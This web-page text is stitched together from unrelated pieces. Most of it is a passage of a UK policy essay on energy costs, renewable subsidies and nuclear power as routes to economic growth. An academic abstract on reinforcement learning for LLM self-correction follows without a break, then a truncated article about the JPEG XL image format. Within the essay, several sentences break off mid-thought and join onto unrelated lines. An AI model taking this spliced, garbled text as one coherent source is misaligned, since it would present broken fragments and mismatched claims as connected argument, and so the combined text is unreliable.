            energy technology of the future: nuclear. In its early years,
            Britain was the world leader in nuclear power. In 1965 we had 21
            nuclear reactors, compared to 19 in the rest of the world combined.
          </p>
          <p>
            Uranium’s energy density – three million times higher than coal –
            suggested that it could be much cheaper as a source of power, since
            it would not necessitate so much mining and transportation. We
            didn’t realise then that nuclear power could also help us to avoid
            damaging climate change. But had we continued down that path, we
            would have inadvertently decarbonised, like France.
          </p>

          </p>
          <p>
            If we had only kept pace with the rate of nuclear rollout that we
            had between 1956 and 1998, by extending the lifetimes of our older
            plants and adding new ones, today we would be producing around 150
            TWh of nuclear power per year, or around 50 percent of our total
            current electricity generation. But we did not. Nuclear power in
            Britain is now half of what it was at its peak, and energy costs
            today are higher than they have been for a century.

            There are good reasons to want the UK to have a large, productive
            industrial base. But any industrial strategy aimed at doing this
            must first reckon with the enormous rises in energy prices for UK
            businesses since the mid-2000s.
            <a href="https://www.gov.uk/government/statistical-data-sets/gas-and-electricity-prices-in-the-non-domestic-sector">The industrial price of electricity</a>
            rose by 153 percent between 2004 and 2021, adjusted for inflation.
            It rose even more brutally again after the Russian invasion of
            Ukraine. Very large industrial customers (those consuming
            70,000–150,000 megawatt-hours of electricity every six months) paid
            more than twice as much in Britain (13.79p per kilowatt-hour) for
            electricity in 2021 as their counterparts in France did (6.62p per
            kilowatt-hour), and, again, the gap has grown since Russia’s
            invasion of Ukraine. Even if energy costs eventually fall back to
            normal pre-war levels, those are still much more expensive in real
            terms than twenty years ago. Fixing this has to be step one for any
            serious industrial strategy.
          </p>
          
          <p>
            High energy costs are a problem across the developed world. Energy
            consumption per capita in even the relatively fast-growing United
            States has flatlined from the early 1970s oil crisis onwards. But
            things are much worse here.
          </p>
          
          <p>
            The UK’s energy use per person has long been far behind that of the
            United States, but it fell behind both France and Germany in the
            post-war era. Despite moderate improvements under Thatcher, it has
            slid since the mid-2000s to fall further below other countries.
          </p>
          
          <p>
            Britain’s energy use per unit of GDP
            <a href="https://www.iea.org/reports/sdg7-data-and-projections/energy-intensity">is now the lowest in the G7</a>, and is lower than nearly every region and every non-tax-haven in
            both Europe and the OECD. By many measures, Britain is the most
            energy-starved nation in the developed world.
          </p>

            The problem of high energy costs for manufacturing was raised by
            Mario Draghi’s
            <a href="https://commission.europa.eu/document/download/97e481fd-2dc3-412d-be4c-f152a8232961_en?filename=The%20future%20of%20European%20competitiveness%20_%20A%20competitiveness%20strategy%20for%20Europe.pdf">recent report on EU competitiveness</a>, which highlighted the strong correlation between an industry’s
            energy intensiveness and its decline since the outbreak of the
            Ukraine war. Draghi also warned that the EU’s traditional
            manufacturing strengths, such as automobiles, were at risk of being
            outcompeted by other countries with cheaper energy.

            Yet British firms pay on average 60 percent more for electricity
            than French ones (the gap is larger for larger customers, as
            mentioned above). The total amount of energy used by the steel
            industry has fallen by about three quarters in the last two decades.
            UK Steel says that ‘long-standing uncompetitive electricity prices
            have constrained UK investment and steel production for some time’,
            and in 2022 when Russia’s invasion of Ukraine drove energy prices to
            their highest-ever levels,
            <a href="https://www.makeuk.org/news-and-events/news/news-from-uk-steel---recent-power-price-spikes">some steel plants paused production at times of the day when

              this problem go away</a>. Data centres, the infrastructure backbone of the internet, have
            become even more essential as artificial intelligence has risen,
            since they are required for both the training and use of AI models.
            And they require enormous amounts of electricity.
          </p>
          <p>
            A large data centre can require
            <a href="https://www.construction-physics.com/p/how-to-build-an-ai-data-center">over 100 megawatts of power, more than 300,000 homes</a>. Electricity is so essential to data centres’ output that
            <a href="https://www.construction-physics.com/p/how-to-build-an-ai-data-center">their scale is typically measured in terms of their electricity
              needs instead of their square footage</a>. Last year they accounted for

            Britain building many large, efficient, well-powered data centres.

            Unfortunately, most prominent examples of industrial strategy ignore
            that high energy costs are by far the biggest problem facing British
            industry today. Subsidies for British industry, like
            <a href="https://www.ft.com/content/476c629c-2918-4836-8b27-362967f9f6dd">the recent commitment to give Tata £500 million to invest in
              steelmaking here,</a>
            are an expensive sticking plaster on this much bigger wound.

          <p>
            <a href="https://assets.publishing.service.gov.uk/media/66a79e0bfc8e12ac3edb0629/DUKES_1.1.1.xlsx">Just over three quarters of the energy we use</a>
            still comes from gas and oil, directly heating our houses and
            powering our cars. Gas is also widely used for industrial heat
            generation. But we are attempting to electrify our economy, which
            means replacing gas boilers with heat pumps, and petrol cars with
            electric ones. Shifting to electric road vehicles
            <a href="https://www.sustainabilitybynumbers.com/p/uk-ev-electricity-demand">will create 40 percent more <em>total</em> electricity demand</a>. Data centres are entirely reliant on electricity. Rising
            temperatures from climate change will necessitate
            <a href="https://www.worksinprogress.news/p/heat-waves">more use of air conditioning</a>
            that runs on electricity. So it is especially worrying that we are
            so far behind peer economies on electricity generation, and have
            been generating less and less electricity since the start of the
            century.

            If energy stagnation is,
            <a href="https://press.stripe.com/where-is-my-flying-car">as some economists and engineers have suggested</a>, a cause of the West’s slowdown over the past fifty years, then it
            should be no surprise that Britain’s economy has fared as badly as
            it has. Along with inadequate housing and transport, this is one of
            the most fundamental weaknesses of the contemporary British economy.
            Any attempt to change course has to accept the central importance of
            cheap, abundant energy to prosperity.

            Britain has committed, with the rest of the developed world, to
            bringing its carbon emissions down significantly over the next three
            decades.
          </p>
          <p>
            Greenhouse gas emitters do not bear the true costs they impose on
            the world. A (<a href="https://commonslibrary.parliament.uk/research-briefings/cbp-9935/">border-adjusted</a>) carbon tax that made them pay the social cost of the emissions
            they created would make the true costs of their emissions clear, and
            would make cleaner forms of energy significantly more
            cost-competitive, and possibly outright cheaper. It would also
            provide an ‘automatic’ impetus to develop and adopt technologies
            like carbon capture and carbon removal.
          </p>
          <p>
            But carbon taxes have often failed politically where they have been
            tried, pushing politicians towards subsidies, price guarantees and
            other incentives to move to clean energy sources instead. Though
            this approach still tilts the balance toward cleaner technologies,
            its true costs are hidden. And because this approach necessitates
            the government picking winners, it may mean paths to decarbonisation
            that are much more costly than others.
          </p>
          <p>
            Intermittent renewables, which are primarily wind and solar power in
            the British market, are sources that, though clean, cannot produce a
            constant supply of electricity, and cannot be turned on at will.
            This means that the marginal price of electricity
            <em>as traded between generators and energy suppliers</em> is
            largely set by the marginal cost of booting up power plants that can
            produce enough to meet demand at any given time. Usually those
            plants run on natural gas. This means that short-term wholesale
            electricity prices tend to be set by gas prices.
          </p>
          <p>
            The price of electricity as actually paid by consumers, however,
            differs from the <em>wholesale</em> cost of electricity as traded
            between generators and suppliers. This wholesale cost is only about
            <a href="https://commonslibrary.parliament.uk/research-briefings/cbp-9491/">30-40 percent of the total bill</a>
            that a consumer pays. Electricity consumers, which include both
            industrial consumers and households, need to pay for the costs of
            the entire electricity system, not just generation: the transmission
            and distribution networks, the growing costs of balancing the grid,
            plus a margin for suppliers, plus the policy costs of whatever
            subsidies to electricity generators the government has seen fit to
            pay, plus the costs of contracts for rarely-used but essential
            emergency backup generation. There is no necessary reason why these
            costs need to fall on energy consumers: some could equally well be
            paid from general taxation. But either way the costs must be paid.
          </p>
          <p>
            Therefore, from the perspective of a consumer, what matters is not
            the price of electricity from a given wind farm as traded on the
            wholesale market, but the total cost of the entire electricity
            supply system.
          </p>
          <p>
            It is commonplace to claim that electricity generated from
            <a href="https://x.com/Ed_Miliband/status/1562444641236316161">wind</a>
            <a href="https://www.bbc.co.uk/news/articles/crkm5p1x6deo">or solar</a>
            power is <em>cheaper</em> than electricity from traditional power
            plants. Yet the more wind and solar we hook up to the grid, and the
            more fossil fuel power plants we retire, the higher bills seem to
            go.
          </p>
          
          <p>
            In fact, intermittent renewable energy is nowhere near commercially
            competitive. According to the
            <a href="https://obr.uk/download/march-2024-economic-and-fiscal-outlook-detailed-forecast-tables-receipts/?tmstv=1726074283">Office for Budget Responsibility</a>
            and Ofgem, the direct costs of subsidies of renewable power
            generation now exceed £10 billion a year, across the Renewables
            Obligation, Contracts for Difference, and
            <a href="https://www.ofgem.gov.uk/publications/feed-tariffs-fit-annual-report-2022-23">Feed-in-Tariff schemes</a>, which provide a guaranteed price for electricity generated by
            renewables over, normally, a fifteen-year time horizon. The
            <a href="https://assets.publishing.service.gov.uk/media/66d6ad7c6eb664e57141db4b/Contracts_for_Difference_Allocation_Round_6_results.pdf">September 2024 auction for Contracts for Difference</a>, which covered new supply equivalent to eight percent of the UK’s
            current electricity generation, concluded with the state
            guaranteeing an inflation-indexed price
            <a href="https://x.com/RichardOllingtn/status/1830922442526859688">30 percent higher than current wholesale market prices</a>
            to a range of renewable energy suppliers for the next 15 years.
            These costs are passed on to energy customers through higher prices.
          </p>
          <p>
            But as well as the direct subsidy needed to make intermittent
            sources of electricity profitable, these renewables increase other
            system-level costs that are paid by consumers. There are three main
            sources of this:
          </p>
          <ul>
            <li>
              <strong>More need for transmission lines to connect generation to
                households and industry</strong>. Traditionally, power plants were located fairly close to major
              population centres. The highest wind speeds, however, are
              available offshore and in northern Scotland. Add in the impact of
              the planning system pushing wind farms to locate in more remote
              places, and the result is that the annual costs of transmission
              maintenance and installation have risen from
              <a href="https://www.nationalgrideso.com/document/49546/download">£1.35 billion in 2008/9</a>
              to
              <a href="https://www.nationalgrideso.com/document/294586/download">over £4 billion in 2024/25</a>.
              <a href="https://www.nationalgrideso.com/news/eso-publishes-pathway-2030-major-step-deliver-50gw-offshore-wind-2030">The UK’s electricity system operator plans for £54 billion</a>
              of total transmission spending between now and 2030, citing the
              need to accommodate a large increase in offshore wind generation
              during this period.
            </li>
            <li>
              <strong>Increased grid balancing costs.</strong> Electricity
              supply must be matched to demand on a second-by-second basis. As
              increasing fractions of the generation mix become
              weather-dependent and hence to a degree uncontrollable and
              unpredictable, the grid operator needs to spend more money both on
              paying generators to switch off when supply exceeds demand, but
              also for emergency backup generation to come online when wind
              speeds drop. These balancing costs
              <a href="https://www.nationalgrideso.com/document/318516/download">are estimated at £2.4 billion for 2023/24</a>, and
              <a href="https://www.nationalgrideso.com/document/318516/download">are estimated by the Electricity System Operator to rise to
                over £4 billion a year by the end of the decade</a>.
            </li>
            <li>
              <strong>The costs of paying for backup capacity</strong>. This is
              especially important for periods of multi-week lulls in wind
              speeds, which can occur during periods with overcast weather that
              curtail solar generation as well. These periods require a fleet of
              dispatchable plants with total capacity approximately equal to
              peak demand, powered either by gas or, in some envisioned Net Zero
              scenarios, hydrogen stored for years in underground salt caverns.
              Batteries may become viable for energy storage across a day or a
              few days, but seem unlikely to be able to provide for weeks-long
              lulls in wind and sunlight. Currently the UK has
              <a href="https://www.renewableuk.com/news/660775/Pipeline-of-UK-energy-storage-projects-grows-by-two-thirds-over-last-12-months.htm">4.6 gigawatt-hours of battery storage capacity</a>, or about 0.3 percent of daily energy demand.<p>Since
              these plants will, in optimistic Net Zero scenarios, operate
              relatively rarely and so be unable to sufficiently recoup their
              costs through electricity sales alone, they will likely require
              ongoing subsidy. So far we have committed over
              <a href="https://energy.drax.com/insights/t-4-capacity-market-auction-for-2027-28/">£3.6 billion</a>
              to pay for backup energy supply in 2027/8, based on recent auction
              results, and it is unclear if even this expenditure is sufficient
              to ensure security of supply given the planned partial reliance on
              electricity imports from Europe.
            </p></li>
          </ul>
          <p>
            Once these system-level costs are accounted for, building a grid
            around wind and solar power is much more expensive than implied by
            the Levelized Cost of Energy (or LCOE) estimates typically cited by
            government departments or the press, and – along with the
            decommissioning of coal and gas-fired power plants since the 2000s –
            explains why Britain’s electricity costs have risen so much compared
            to other countries’.

            None of this section is to say that intermittent renewables are bad
            or pointless. Reducing carbon emissions is essential, and the true
            cost of fossil fuels is higher than it appears because of the carbon
            emissions they create. We can improve efficiency by allowing
            electricity prices to reflect the actual cost of supplying
            electricity to a given premises (what is known as locational
            pricing) and the real-time value of the electricity (time-of-use
            pricing).

          <p>
            In many parts of the world the problems these power sources face are
            much less significant: for example, where there is more constant
            sunshine across the year, solar is much less intermittent. It may
            turn out that building interconnectors between Britain and
            continental Europe and Africa means we can import solar electricity
            from these sunnier latitudes.
            <a href="https://aquind.co.uk/">A proposed interconnector</a>
            between Portsmouth and France would add 2,000 megawatts, or 16
            terawatt hours a year, to Britain’s electricity supply: enough to
            power twenty large data centres, four million new homes, or
            one-seventh of our road transport needs if we switched entirely to
            electric vehicles. However, this project and others like it
            <a href="https://watt-logic.com/2024/06/28/ofgem-throws-a-spanner-into-gbs-interconnector-ambitions/">may be rejected by Ofgem, the energy regulator</a>.
          </p>
          <p>
            Or we may make technological breakthroughs, for example in
            ultra-dense battery storage, or in atmospheric carbon capture, that
            make some of our current problems irrelevant. But, for now, the
            current consensus in favour of large, increasing subsidies for
            intermittent renewables in Britain is a consensus in favour of high
            and rising energy costs.
          </p>
          <p>
            In order to prosper again, Britain needs abundant and reliable clean
            energy. Intermittent renewables may be able to give us this someday,
            but they cannot provide it yet. Thankfully, there is a technology
            that can: nuclear power.
          </p>
          <h4 id="nuclear-power">Nuclear power</h4>
          <p>
            Nuclear power avoids the biggest problem that solar and wind power
            face: it produces constant amounts of electricity across the day and
            year. This means we can depend on it. Its operation produces
            essentially zero carbon dioxide. It already provides
            <a href="https://pris.iaea.org/PRIS/WorldStatistics/NuclearShareofElectricityGeneration.aspx">two thirds of France’s electricity</a>. And it
            <a href="https://ourworldindata.org/grapher/death-rates-from-energy-production-per-twh">is safer than almost any other source of electricity, even wind
              power</a>.
          </p>
          <p>
            Britain, once a world leader in atomic power, hasn't built a new
            nuclear power station in the last 28 years, during which period
            <a href="https://lordslibrary.parliament.uk/the-role-of-nuclear-in-the-uks-energy-supply/">it has shuttered eight</a>
            reactors – and
            <a href="https://www.nao.org.uk/reports/the-decommissioning-of-the-agr-nuclear-power-stations/">eight more are set for the chop</a>. Nuclear power accounts for only 12.5 percent of our annual
            electricity output.
          </p>
          
          <p>
            The cost of building new reactors has become eye-wateringly high.
            Our nuclear power construction costs are the second highest in the
            world, but this is not inevitable or inherent in the technology:
            nuclear power
            <a href="https://jackdevanney.substack.com/p/nuclear-is-too-expensive">was once cost-competitive with <em>coal</em></a>.
          </p>
          <p>
            Unlike with intermittent power, however, these high costs are not
            intrinsic to nuclear. In general, it is expensive to build reactors
            for the same extraneous reasons that it is expensive to build
            railways and trams. And, as with trams and trains, if we can make it
            cheaper to build nuclear reactors, we can have a lot more of them.
          </p>
          
          <p>
            Britain wasn’t always this expensive. For plants constructed before
            1995, Britain averaged £4.79 million per MW, about half of the
            estimated costs for Hinkley Point C and Sizewell C. Even the most
            expensive reactors permissioned and commissioned under Margaret
            Thatcher and John Major, Sizewell&nbsp;B and Torness, were only
            two-thirds the price in real terms of the plants we are planning
            today. These plants have produced zero-emissions power for decades
            and
            <a href="https://normielisation.substack.com/p/the-half-life-of-local-support-for">could continue to do so for decades more if they weren’t being
              closed down</a>.
          </p>
          
          <p>
            One reason nuclear power is so expensive to build is that it is
            beset by extreme delays and uncertainty caused by planning and
            environmental approval processes. These arise even when deploying
            completely safe, widely used designs that have been built in Britain
            before. From being proposed in a UK government white paper, to the
            start of construction, Hinkley Point C took ten years. By contrast,
            France and Finland have started building similar reactors in just
            three or four.
          </p>
          <p>
            With a
            <a href="https://assets.nationbuilder.com/themes/64129ab34764e88389de397e/attachments/original/1680254554/Powerbook-Brochure-WEBAWK_REV3.pdf?1680254554">44,260 page</a>
            environmental impact assessment (EIA) and 2,229 written questions at
            examination stage, Sizewell C, the next reactor after Hinkley Point
            C, faced enormous expense before a spade was even in the ground
            (which it still is not). As the recent MHCLG policy paper
            <a href="https://www.gov.uk/government/publications/getting-great-britain-building-again-speeding-up-infrastructure-delivery/getting-great-britain-building-again-speeding-up-infrastructure-delivery">Getting Great Britain building again</a>
            pointed out, Sizewell C’s EIA is ‘more than 30 times longer than the
            complete works of Shakespeare.’
          </p>
          <p>
            Nuclear power has also suffered from many of the problems that have
            inflated the cost of transport projects. Rather than setting up a
            pipeline of nuclear projects, we are designing and approving each
            one in isolation. There is no strong interest group in favour of
            reducing costs, so trivial objections – like the ‘problem’ of a few
            dozen fish being sucked into a reactor’s cooling system and killed –
            lead to further delays and expense (in this case,
            <a href="https://www.samdumitriu.com/p/visiting-the-worlds-most-expensive">with an underwater megaphone to scare fish away</a>). Spurious concerns about trace amounts of background radiation,
            long-debunked by the hundreds of nuclear reactors in operation
            worldwide, are treated with grave seriousness in each case, rather
            than being immediately identified and dismissed as obstructionist
            pseudoscience.
          </p>
          <p>
            Although most of the developed world has suffered similar increases
            in the cost of building new nuclear, although less extreme than
            Britain’s, there are some notable exceptions. South Korea stands out
            among developed countries as building nuclear power stations that
            are reliable, safe, and cheap: Korea builds reactors domestically
            for about a sixth of the cost that Britain does.
          </p>
          <p>
            A key reason it can do this is that it builds nuclear plants in
            fleets. For each design, KEPCO, South Korea’s nuclear company,
            builds 8-12 reactors in a row, meaning it benefits from economies of
            scale and
            <a href="https://en.wikipedia.org/wiki/Learning-by-doing_(economics)">learns by doing</a>. (Similar benefits of learning-by-doing through repeated builds of
            similar designs have been observed in the
            <a href="https://thebreakthrough.org/issues/energy/chinas-impressive-rate-of-nuclear-construction">Chinese nuclear build-out.</a>) KEPCO is now building reactors for the UAE at
            <a href="https://www.spectator.co.uk/article/why-britain-is-building-the-worlds-most-expensive-nuclear-plant/">less than half the cost of Hinkley Point C</a>
            per unit of energy.
            <a href="https://www.world-nuclear-news.org/Articles/KHNP-selected-to-supply-new-Czech-nuclear-units">It has just been contracted to build in Czechia</a>
            for <em>a quarter</em> the price of Hinkley.
          </p>
          <p>
            The UK thus has one hard, but potentially rewarding, option of
            attempting to streamline nuclear reactor approvals and delivery,
            perhaps through opening up a new pathway to ‘small modular reactors’
            or ‘microreactors’ that avoids the wasteful cost of our existing
            regulatory system. If successful, this would have the dual benefit
            of enabling cheap, abundant, clean energy, <em>and</em> the creation
            of a potential export industry that could offer cheap nuclear power
            to other developed countries.
          </p>
          <p>
            The faster and cheaper option would be to simply follow the Czechs
            and call KEPCO, asking how many nuclear reactors it could provide at
            similar or lower costs, and how quickly they can get going.

          <p>
            Britain’s rise to become the world’s first industrial nation was
            predicated on its remarkably early exploitation of fossil fuels,
            especially coal. The age of coal is over. But in the 1950s and
            1960s, another era as an energy giant and industrial power seemed to
            be dawning, with the rise of nuclear power, a technology in which we
            led for decades. Our failure to do this was
            <a href="https://commonslibrary.parliament.uk/research-briefings/sn04046/">cushioned by the discovery of North Sea oil</a>. It can’t cushion us any more.
          </p>
          <p>
            Deindustrialisation was not the inevitable result of economic
            progress. To our
            <a href="https://w3.unece.org/SDG/en/Indicator?id=130">$4,300</a> of
            annual manufacturing output per capita, the Americans produce
            $6,700; the Swedes $7,300; the Germans $8,500; and the Swiss
            $20,000. These are all advanced economies in which the biggest
            fraction of employment and output is services. But part of their
            higher productivity is that they have kept their energy costs well
            below ours and avoided the erosion of their industrial base that we
            have experienced.
          </p>
          <p>
            We can reverse this. Abundant clean energy is achievable with
            technology that already exists. What is lacking is a reliable
            pathway to allow it to get built. Fix that, and Britain could see
            itself become an industrial heavyweight for the second time in its
            history.
          </p>
          <h3 id="the-prize">The prize</h3>
          <p>
            The fundamental thesis of this essay is that Britain can have rapid
            economic growth in the near future, swiftly catching up with the
            world’s most prosperous countries. It can do this because the
            sources of its current sclerosis are easy to identify and
            straightforward, in principle, to fix. The problem is not too little
            investment by the state. It is that the state has prohibited most of
            the investments we need to make. The solution is to remove these
            obstacles to investment, mobility and trade, in a politically viable
            and durable way.
          </p>
          <p>
            We should not despair. Britain has been here before a century ago,
            and triumphed. By the end of the 1920s, Britain was still reeling
            from the national catastrophe of the First World War. Many damaging
            emergency measures that had been brought in during the War still
            lingered, it was recovering from levels of inflation never seen
            before or since, and economic growth had slowed to a crawl.
          </p>
          <p>
            The housing sector was moribund, thanks to a combination of rent
            controls imposed during the First World War, tight lending policy,
            and the effects of rapid inflation, which made the rent controls
            even more punitive in real terms.
          </p>
          <p>
            Stanley Baldwin’s government abolished rent controls and removed
            mortgage regulations by 1932, causing a dramatic housing boom that
            provided the foundations for the British economic miracle of the
            1930s. Millions of extra homes were built in just six years – the
            fastest period of building ever – probably
            <a href="https://cepr.org/voxeu/columns/escaping-liquidity-traps-lessons-uks-1930s-escape">adding several percentage points to GDP growth in just a few
              years</a>. The homes were concentrated in the cities in which Britain’s key
            growth industries were based, giving those industries access to the
            workforce they needed to continue expanding. It may have been the
            greatest rapid expansion in a given economic sector in British
            history, and it was the key reason we didn’t experience a Great
            Depression while Germany, the USA, and France did.
          </p>
          <p>
            These homes were enabled by rapid infrastructure development: new
            roads such as the A3 Kingston Bypass, an enormous expansion of the
            bus network, and extensions of many of the major railways and tube
            networks, with the Piccadilly, District and Northern Lines sweeping
            out into suburban London.
          </p>
          <p>
            During this time Britain built its national electricity grid, in one
            of the most remarkable achievements of engineering and public works
            in modern history. In the space of three years, the new Central
            Electricity Board
            <a href="https://www.nationalgrid.com/about-us/what-we-do/our-history/history-electricity-britain">devised a plan</a>
            to connect more than 100 of the UK’s most efficient power stations
            into seven local grids across the country, and passed the
            legislation needed to enable the plan and begin work on it. It took
            just five years for the project to be completed in 1936, with 4,000
            miles of cables running across 26,000 pylons around the country
            being built in this time.
          </p>
          <p>
            In 1937, a year after the seven local grids were finished, a group
            of impatient and rebellious engineers
            <a href="https://worksinprogress.co/issue/building-back-faster/">switched on the connections</a>
            between the seven grid areas themselves to form a single national
            system, deciding it was easier to ask forgiveness than permission.
            They created a world-class grid that remains in operation to this
            day. The price of electricity
            <a href="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/UK_historical_electricity_price_1921-1990.svg/750px-UK_historical_electricity_price_1921-1990.svg.png">collapsed</a>
            and the share of the population connected to electricity soared,
            rising faster than in any other country on earth. Britain went from
            being a laggard to a leader in electrification in just a few years.
          </p>
          <p>
            We believe that Britain can enjoy such a renewal once more. To do
            so, it need simply remove the barriers that stop the private sector
            from doing what it already wants to do: build homes, bridges,
            tunnels, roads, trams, railways, nuclear power plants, grid
            connections, prisons, aqueducts, reservoirs, and more.
          </p>
          <p>
            The immediate effect would be large increases in employment in
            construction, energy, real estate, plumbing, factories, steelworks,
            cement production, surveying, architecture, design, and more. It
            would mean large inflows of capital to invest in these newly
            available opportunities.
          </p>
          <p>
            There is massive pent-up demand for new housing, more energy supply,
            more and better transport links, and more childcare provision, as
            shown by their high prices. Since a price is ‘a signal wrapped in an
            incentive’, making it easier to build and supply these things would
            not require top-down direction or government spending.
          </p>
          <p>
            The short-term effect, then, would be a surge of economic activity
            as these investments were made. But the real benefits come when
            those investments begin to pay off.
          </p>
          <p>
            The medium-term effect would be to dramatically increase
            productivity growth in the UK, driven by agglomeration. It would
            mean more people accessing high quality jobs, allowing productive
            companies to hire more people and scale up, and to operate cheaply
            thanks to cheaper commercial premises and lab space, and cheaper
            energy. Services companies would expand rapidly, and new companies
            would be set up. The cheaper energy would rejuvenate many of the
            traditional industries of the North of England, including
            manufacturing.
          </p>
          <p>
            In the long run, cheaper housing in particular would have a range of
            knock-on effects. Cheaper housing means more affordable childcare
            and bedrooms, and less of a trade-off between having children and
            staying in the city to be close to friends and job. All of these
            will help families to afford more children, if they want them,
            making it easier to bear the costs of an ageing population.
          </p>
          <p>
            More agglomeration also means more innovation. A larger labour pool
            gives innovative firms more options about whom to hire, and more
            similar companies with which to partner to come up with new ideas.
            Allowing the science-based industries around Oxford and
            <a href="https://www.createstreets.com/the-promise-of-cambridge/">Cambridge</a>
            to grow as freely as their competitors in places like Silicon Valley
            and Boston can allow a virtuous cycle where more and more innovative
            companies start up or locate in these cities, creating greater and
            greater returns to similar firms coming there too, and more scope
            for productive collaboration between them.
          </p>
          <p>
            Fundamentally, making building possible would unlock the promise of
            the British economy. All the ideas, entrepreneurs, researchers, and
            skilled workers we have are being held back from being as productive
            as they could be, and the aggregate cost is that the country is much
            poorer than it should be. If we address this, Britain could be once
            again among the richest of nations.
          </p>

            In its turn, affluence would – if wisely used –&nbsp;begin to solve many
            of Britain’s other problems. Public services could be given more
            generously funded, facilitating reforms to make them more efficient.
            Aided by planning reform, we could build new and better resourced
            hospitals, yielding shorter waiting lists and better patient
            outcomes. We could adopt the generous family policies of places like
            <a href="https://ifstudies.org/ifs-admin/resources/reports/ifs-southerneuropereport-final-1.pdf">France</a>
            and
            <a href="https://www.boomcampaign.org/p/the-province-defying-italys-birth">South Tyrol</a>
            to allow younger couples to have children sooner if they wish to,
            widening the choices available to the British people while helping
            to secure their long-term future. Elderly Britons could receive the
            finest care in the world, delivered through immigration only if we
            wish, and not as a substitute for adequate funding. Britain could
            have a new generation of schools, like the great board schools that
            rose over the cities of the nineteenth century. We could expand our
            prison, police and prosecution services, becoming again a virtually
            crime-free society such as our grandparents knew, and such as Japan
            remains today. We could have the finest armed forces in Europe,
            playing again a decisive role in defending the law-governed world
            order that Britain did so much to bring into being.
          </p>
          <p>
            We began this essay by saying that unlocking prosperity can
            reinforce what is best in Britain’s social settlement. The parallel
            to the 1930s should remind us of this. Across the world, the
            economic collapse of the 1930s brought social malaise and political
            destabilisation. Britain’s success and prosperity averted these, and
            left it to face crisis and war in a position of strength, unity and
            confidence. The international situation today is not so grave as it
            was then. But the future is always perilous, and it is vital that
            Britain should once more have the strength and self-belief of 1939
            with which to play its part in the leadership of the free world.
          </p>
          <p>
            The good news is that the hardest things to create are ours already.
            No government can legislate into being a respect for the rule of
            law, appetite for scientific discovery and entrepreneurship, or
            tolerance of eccentricity and debate. Such a culture takes centuries
            to build: it is the most precious inheritance that we have received
            from the generations that went before us. By comparison, what we
            must do is surprisingly simple: get Britain building by removing
            barriers and lowering costs. If we can establish these foundations,
            growth and dynamism will follow. We have done this before. We can do
            it again.

            <span>Abstract:</span>Self-correction is a highly desirable capability of large language models (LLMs), yet it has consistently been found to be largely ineffective in modern LLMs. Existing approaches for training self-correction either require multiple models or rely on a more capable model or other forms of supervision. To this end, we develop a multi-turn online reinforcement learning (RL) approach, SCoRe, that significantly improves an LLM's self-correction ability using entirely self-generated data. To build SCoRe, we first show that variants of supervised fine-tuning (SFT) on offline model-generated correction traces are insufficient for instilling self-correction behavior. In particular, we observe that training via SFT either suffers from a distribution mismatch between the training data and the model's own responses or implicitly prefers only a certain mode of correction behavior that is often not effective at test time. SCoRe addresses these challenges by training under the model's own distribution of self-generated correction traces and using appropriate regularization to steer the learning process into learning a self-correction strategy that is effective at test time as opposed to simply fitting high-reward responses for a given prompt. This regularization prescribes running a first phase of RL on a base model to generate a policy initialization that is less susceptible to collapse and then using a reward bonus to amplify self-correction during training. When applied to Gemini 1.0 Pro and 1.5 Flash models, we find that SCoRe achieves state-of-the-art self-correction performance, improving the base models' self-correction by 15.6% and 9.1% respectively on the MATH and HumanEval benchmarks.

One such improvement is the inclusion of JPEG XL file types, which promise improved image quality compared to standard JPEG files while delivering relatively smaller file sizes. </p>  <h2>What Is JPEG XL? </h2> <p><a href="https://jpeg.org/jpegxl/" data-wpel-link="external" target="_blank" rel="follow external noopener">JPEG XL</a> is a next-generation image encoding standard formally standardized in early 2022. Since then, JPEG XL (.jxl) has been adopted by numerous operating systems and applications, albeit with some notable holdouts. </p> <p>Apple and its various software iterations have supported JPEG XL for at least a year, including in Finder, Preview, Final Cut Pro, Pages, Photos, Mail, Safari, and more. Adobe has also supported the format for a while, including in Adobe Camera Raw and Lightroom Classic. </p> <figure id="attachment_759567" aria-describedby="caption-attachment-759567"><img decoding="async" src="https://petapixel.com/assets/uploads/2024/09/jpeg-xl-smaller-file-size-800x662.jpg" alt="A comparison image highlighting the efficiency of JPEG XL over traditional JPEG. On the left, a JPEG image of colorful umbrellas against a blue sky is shown with a score of 75.8, while the JPEG XL version on the right has a higher score of 86.3, indicating better quality despite smaller file size." width="800" height="662" srcset="https://petapixel.com/assets/uploads/2024/09/jpeg-xl-smaller-file-size-800x662.jpg 800w, https://petapixel.com/assets/uploads/2024/09/jpeg-xl-smaller-file-size-320x265.jpg 320w, https://petapixel.com/assets/uploads/2024/09/jpeg-xl-smaller-file-size-1536x1270.jpg 1536w, https://petapixel.com/assets/uploads/2024/09/jpeg-xl-smaller-file-size.jpg 1600w" sizes="(max-width: 800px) 100vw, 800px"><figcaption id="caption-attachment-759567">Credit: jpegxl.info</figcaption></figure> <p>Despite JPEG XL supporting reversible JPEG transcoding and being superior to JPEG in terms of quality and efficiency, the format has yet to be widely adopted. Neither Chrome nor Firefox, two very popular web browsers, support the format natively, for example. Extensions are available to support JPEG XL files, but they’re not installed by default. </p> <p>The <a href="https://jpegxl.info/" data-wpel-link="external" target="_blank" rel="follow external noopener">JPEG XL community website</a> cites the format’s ability to reduce file size while delivering “unmatched quality-per-byte.” Compared to a standard JPEG, a JPEG XL file is up to 55% smaller while providing a cleaner image that is visually lossless. Gone are typical JPEG artifacts. </p>
<p>Although it’s easy to appreciate the technical advantages of JPEG XL, it is also worth pointing out a substantial benefit of smaller file sizes: reduced environmental impact. As the world generates increasing amounts of data, it’s essential to consider ways to reduce data load. All that <em>stuff</em> lives somewhere, and wherever it is, it requires energy to operate. </p> <p>It’s also important to note that JPEG XL supports wide-gamut and high dynamic range images. “JPEG XL is specifically designed to handle the rich colors of high-precision, high-dynamic range images,” the creators explain. </p> <figure id="attachment_759570" aria-describedby="caption-attachment-759570"><img decoding="async" src="https://petapixel.com/assets/uploads/2024/09/jpeg-xl-wide-gamut-hdr-800x695.jpg" alt="An abstract image showcasing vibrant colors and combining wide-gamut and HDR technology for stunning color accuracy.

